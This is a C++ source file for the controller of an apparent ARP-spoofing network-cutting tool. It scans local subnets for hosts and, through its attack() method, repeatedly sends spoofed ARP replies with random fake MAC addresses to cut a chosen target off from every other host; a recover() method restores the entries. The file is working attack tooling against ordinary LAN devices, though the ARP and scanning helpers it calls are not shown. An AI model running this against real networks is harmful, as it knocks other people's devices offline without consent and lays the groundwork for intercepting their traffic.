#include "models/controller.hpp"
#include "utils/mac_utils.hpp"
#include "utils/socket_utils.hpp"
#include "utils/string_utils.hpp"
#include "utils/thread_utils.hpp"

#include <algorithm>
#include <iostream>

typedef std::chrono::high_resolution_clock Clock;

Controller::Controller(const uint32_t attack_interval_ms, const uint32_t scan_interval_ms) 
            : attack_interval_ms(attack_interval_ms), scan_interval_ms(scan_interval_ms) {}

void Controller::scan_targets() {
    auto current_time = Clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(current_time - last_scan_time).count();
    if (duration < scan_interval_ms) { // don't scan the network too often
        return;
    }

    std::vector<Host> active_hosts = scanner.scan_networks();
    for (const Host &active_host : active_hosts) {
        hosts.insert(active_host);
    }
    last_scan_time = Clock::now();
}

std::vector<Host> Controller::get_targets() const {
    return std::vector<Host>(hosts.begin(), hosts.end());
}

Host Controller::get_host(const std::string &target_ip) const {
    for (const Host &host : hosts) {
        if (host.get_ip() == target_ip) {
            return host;
        }
    }

    return Host();
}

ACTION_STATUS Controller::action(const std::string &target_ip) {
    auto iter = hosts.find(Host(target_ip));
    if (iter == hosts.end()) {
        return ACTION_STATUS::TARGET_NOT_FOUND;
    }

    if (iter->is_cut()) {
        recover(*iter);
        return ACTION_STATUS::RECOVER_SUCCESS;
    } else {
        attack(*iter);
        return ACTION_STATUS::CUT_SUCCESS;
    }
}

void Controller::attack(const Host &target) {
    Interface interface = scanner.get_interface_by_ip(target.get_ip());
    for (const Host &host : hosts) {
        if (host.get_ip() == target.get_ip() || !interface.is_same_subnet(host.get_ip())) {
            continue;
        }

        if (arp.find(target) == arp.end()) {
            arp[target] = ARP(interface);
        }

        if (fake_mac_address.find(host) == fake_mac_address.end()) {
            fake_mac_address[host] = get_fake_mac_address();
        }

        arp[target].spoof(target, host, attack_interval_ms, fake_mac_address[host]);
    }
    target.set_status(Status::CUT);
}

void Controller::recover(const Host &target) {
    Interface interface = scanner.get_interface_by_ip(target.get_ip());
    for (const Host &host : hosts) {
        if (host.get_ip() == target.get_ip() || !interface.is_same_subnet(host.get_ip())) {
            continue;
        }
        arp[target].recover(target, host);
    }
    target.set_status(Status::NORMAL);
}

void Controller::recover_all_hosts() {
    for (const Host &host : hosts) {
        if (host.is_cut()) {
            recover(host);
        }
    }
}

std::string Controller::get_fake_mac_address() const {
    return Mac::get_random_mac_address();
}